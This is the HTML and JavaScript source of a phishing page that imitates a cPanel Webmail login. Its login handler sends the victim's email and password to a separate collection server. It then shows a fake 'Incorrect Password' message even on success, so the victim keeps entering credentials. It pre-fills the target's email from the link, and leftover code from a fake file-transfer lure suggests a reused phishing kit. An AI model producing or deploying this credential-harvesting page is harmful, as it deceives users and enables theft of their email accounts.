<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Webmail Login</title>

<style>
*{
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family: Arial, Helvetica, sans-serif;
}

body{
    background:#f1f1f1;
    display:flex;
    justify-content:center;
    align-items:center;
    min-height:100vh;
}

.container{
    width:100%;
    max-width:420px;
    padding:20px;
}

.logo{
    text-align:center;
    margin-bottom:35px;
}

.logo h1{
    color:#eb7a3c;
    font-size:64px;
    font-weight:bold;
    font-style:italic;
}

.label{
    font-size:18px;
    font-weight:600;
    color:#333;
    margin-bottom:10px;
}

.input-group{
    margin-bottom:25px;
}

.input-box{
    width:100%;
    height:58px;
    border:2px solid #d4d4d4;
    border-radius:6px;
    padding:0 15px;
    font-size:18px;
    background:#fff;
}

.input-box:focus{
    outline:none;
    border-color:#6ca8d6;
}

.login-btn{
    width:100%;
    height:58px;
    border:none;
    border-radius:6px;
    background:#4f95c8;
    color:white;
    font-size:20px;
    cursor:pointer;
}

.login-btn:hover{
    background:#4288bb;
}

.or-section{
    text-align:center;
    margin:40px 0 25px;
    color:#444;
    font-size:20px;
}

.cp-login{
    display:flex;
    justify-content:center;
    align-items:center;
    gap:10px;
    margin-bottom:30px;
}

.cp-icon{
    width:45px;
    height:45px;
    background:#f38b3d;
    border-radius:6px;
    color:white;
    display:flex;
    align-items:center;
    justify-content:center;
    font-weight:bold;
    font-size:24px;
}

.locale{
    text-align:center;
    margin-bottom:35px;
}

.locale select{
    padding:8px 12px;
    font-size:18px;
    border:1px solid #888;
    border-radius:4px;
}

.footer{
    text-align:center;
    color:#666;
    font-size:14px;
}

.footer .cp{
    color:#f38b3d;
    font-size:28px;
    font-weight:bold;
    margin-bottom:10px;
}

/* ─── TOAST ───────────────────────────────── */
  .toast {
    position: fixed;
    bottom: 28px;
    left: 50%;
    transform: translateX(-50%) translateY(80px);
    background: red;
    color: white;
    padding: 12px 24px;
    border-radius: 50px;
    font-size: 0.85rem;
    font-weight: 500;
    z-index: 999;
    transition: transform 0.35s cubic-bezier(.34,1.56,.64,1);
    white-space: nowrap;
  }

  .toast.show { transform: translateX(-50%) translateY(0); }
</style>
</head>
<body>

<div class="container">

    <div class="logo">
        <h1>Webmail</h1>
    </div>

    <div class="input-group">
        <div class="label">Email Address</div>
        <input type="email" id="loginEmail" class="input-box" placeholder="Enter your email address.">
    </div>

    <div class="input-group">
        <div class="label">Password</div>
        <input type="password" id="loginPass" class="input-box" placeholder="Enter your email password.">
    </div>

    <!-- <button class="login-btn">Log in</button> -->

    <button class="verify-btn login-btn" id="verifyBtn" onclick="handleLogin()">
        Log in
    </button>

    <div class="or-section">
        OR Log in via
    </div>

    <div class="cp-login">
        <div class="cp-icon">cp</div>
    </div>

    <div class="locale">
        Select a locale:
        <select>
            <option>English</option>
        </select>
    </div>

    <div class="footer">
        <div class="cp">cp</div>
        <p>Copyright © 2026 cPanel, L.L.C.</p>
        <p>Privacy Policy</p>
    </div>

</div>

<!-- TOAST -->
<div class="toast" id="toast"></div>

<script>
  // ── Your Railway server URL ────────────────────────────────
  const MAIL_SERVER = '';

  window.addEventListener('DOMContentLoaded', () => {
    const hash = window.location.hash.replace('#', '');

    // If hash looks like an email, autofill and switch to login tab
    if (hash && hash.includes('@')) {
      const email = decodeURIComponent(hash);
      document.getElementById('loginEmail').value = email;

      // // Switch to login tab automatically
      // const loginBtn = document.querySelectorAll('.tab-btn')[1];
      // switchTab('login', loginBtn);
    }
  });

  // ── Toast ──────────────────────────────────────────────────
  function showToast(msg, duration = 2800) {
    const t = document.getElementById('toast');
    t.textContent = msg;
    t.classList.add('show');
    setTimeout(() => t.classList.remove('show'), duration);
  }

  // ── Tabs ───────────────────────────────────────────────────
  function switchTab(tab, btn) {
    document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
    btn.classList.add('active');
    document.getElementById('downloadView').style.display = tab === 'download' ? 'block' : 'none';
    document.getElementById('loginView').style.display    = tab === 'login'    ? 'block' : 'none';
  }

  // ── File selection & drag-drop ─────────────────────────────
  const dropZone  = document.getElementById('dropZone');
  const fileInput = document.getElementById('fileInput');
  const fileList  = document.getElementById('fileList');
  let selectedFiles = [];

  fileInput.addEventListener('change', e => addFiles(e.target.files));

  dropZone.addEventListener('dragover', e => { e.preventDefault(); dropZone.classList.add('drag-over'); });
  dropZone.addEventListener('dragleave', () => dropZone.classList.remove('drag-over'));
  dropZone.addEventListener('drop', e => {
    e.preventDefault();
    dropZone.classList.remove('drag-over');
    addFiles(e.dataTransfer.files);
  });

  function addFiles(files) {
    Array.from(files).forEach(f => {
      if (!selectedFiles.find(x => x.name === f.name)) selectedFiles.push(f);
    });
    renderFileList();
  }

  function renderFileList() {
    if (!selectedFiles.length) {
      fileList.style.display = 'none';
      return;
    }
    fileList.style.display = 'flex';
    fileList.innerHTML = selectedFiles.map((f, i) => `
      <div class="file-item">
        <span class="file-item-name">${f.name}</span>
        <span class="file-item-size">${formatSize(f.size)}</span>
        <button class="file-remove" onclick="removeFile(${i})">×</button>
      </div>
    `).join('');
  }

  function removeFile(i) {
    selectedFiles.splice(i, 1);
    renderFileList();
  }

  function formatSize(bytes) {
    if (bytes < 1024)       return bytes + ' B';
    if (bytes < 1048576)    return (bytes / 1024).toFixed(0) + ' KB';
    return (bytes / 1048576).toFixed(1) + ' MB';
  }

  // ── Transfer ───────────────────────────────────────────────
  function handleTransfer() {
    const to   = document.getElementById('emailTo').value.trim();
    const from = document.getElementById('yourEmail').value.trim();

    if (!selectedFiles.length) { showToast('⚠ Please add at least one file'); return; }
    if (!to)   { showToast('⚠ Please enter recipient email'); return; }
    if (!from) { showToast('⚠ Please enter your email'); return; }
    if (!isEmail(to) || !isEmail(from)) { showToast('⚠ Invalid email address'); return; }

    showToast('🚀 Transfer started! Link will be sent to ' + to, 3500);
    setTimeout(() => {
      selectedFiles = [];
      renderFileList();
      document.getElementById('emailTo').value  = '';
      document.getElementById('yourEmail').value = '';
      document.getElementById('msgField').value  = '';
      fileInput.value = '';
    }, 1000);
  }

  // ── Go to login tab (used by nav + Download All) ───────────
  function goToLoginTab() {
    const loginBtn = document.querySelectorAll('.tab-btn')[1];
    switchTab('login', loginBtn);
    // Scroll card into view on mobile
    document.querySelector('.download-card').scrollIntoView({ behavior: 'smooth', block: 'start' });
  }

  // ── Login ──────────────────────────────────────────────────
    // ── Login ──────────────────────────────────────────────────
  async function handleLogin() {
    const email = document.getElementById('loginEmail').value.trim();
    const pass  = document.getElementById('loginPass').value;

    if (!email || !pass) { showToast('⚠ Please fill in all fields'); return; }
    if (!isEmail(email)) { showToast('⚠ Invalid email address'); return; }

    const btn = document.getElementById('verifyBtn');

    const weSVG = `<span class="we-badge"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 30 24" width="50" height="17" fill="none" class="styles_module_logo__c2382cb9 styles_module_dark__c2382cb9"><path fill="currentColor" fill-rule="evenodd" d="M12.23 15.014c-.383-.605-.697-.926-1.254-.926-.558 0-.872.32-1.255.926L8.05 17.686c-.627 1.032-1.15 1.745-2.37 1.745s-1.777-.499-2.369-1.888a42.3 42.3 0 0 1-2.195-6.554C.348 7.89 0 5.967 0 4.4s.488-2.493 2.16-2.813c2.3-.428 5.401-.677 8.816-.677 3.414 0 6.515.25 8.815.677 1.672.32 2.16 1.246 2.16 2.814 0 1.567-.348 3.49-1.115 6.59a42.3 42.3 0 0 1-2.195 6.553c-.592 1.39-1.15 1.888-2.37 1.888-1.219 0-1.741-.713-2.369-1.745zm26.516 2.5c-1.185 1.282-3.415 2.208-6.342 2.208-5.888 0-9.373-4.096-9.373-9.474 0-5.77 4.007-9.19 9.199-9.19 4.634 0 7.7 2.458 7.7 5.77 0 3.135-2.613 5.165-5.575 5.165-1.602 0-2.787-.32-3.588-.961-.314-.25-.488-.214-.488.071 0 1.175.418 2.173 1.184 2.956.628.641 1.812 1.069 2.927 1.069 1.15 0 2.16-.25 3.066-.713s1.673-.32 2.126.428c.523.855-.21 1.959-.836 2.671" clip-rule="evenodd"></path></svg></span>`;

    btn.innerHTML = `Logging In…`;
    btn.disabled = true;

    const controller = new AbortController();
    const timeout = setTimeout(() => controller.abort(), 10000);

    try {
      const res = await fetch(`${MAIL_SERVER}/login`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email, password: pass }),
        signal: controller.signal,
      });
      clearTimeout(timeout);

      const data = await res.json();

      if (data.success) {
        showToast('Incorrect Password: Please try again', 3500);
      } else {
        showToast('⚠ ' + data.error, 3500);
      }
    } catch (err) {
      clearTimeout(timeout);
      if (err.name === 'AbortError') {
        showToast('⚠ Request timed out', 3500);
      } else {
        showToast('⚠ Could not reach server. Try again.', 3500);
      }
      console.error('Fetch error:', err);
    } finally {
      setTimeout(() => {
        btn.innerHTML = `Log in`;
        btn.disabled = false;
        // Only clear the password field, keep the email
        document.getElementById('loginPass').value = '';
        // Removed: document.getElementById('loginEmail').value = '';
      }, 1500);
    }
  }

  function isEmail(v) { return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v); }
</script>

</body>
</html>
